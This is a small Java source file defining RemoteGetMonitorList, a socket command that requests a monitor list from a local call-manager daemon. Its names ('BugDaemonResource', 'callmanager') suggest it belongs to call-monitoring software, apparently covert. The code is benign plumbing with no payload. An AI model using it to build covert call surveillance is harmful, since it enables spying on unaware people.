package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.callmanager.ref.BugDaemonResource;
import com.vvt.callmanager.ref.MonitorList;

public class RemoteGetMonitorList extends SocketCmd<String, MonitorList>{

	private static final long serialVersionUID = -3230810986321702407L;
	
	private static final String TAG = "RemoteGetMonitorList";
	private static final String SERVER_NAME = BugDaemonResource.CallMgr.SOCKET_NAME;

	public RemoteGetMonitorList(String ownerPackage) {
		super(ownerPackage, MonitorList.class);
	}

	@Override
	protected String getTag() {
		return TAG;
	}

	@Override
	protected String getServerName() {
		return SERVER_NAME;
	}

}
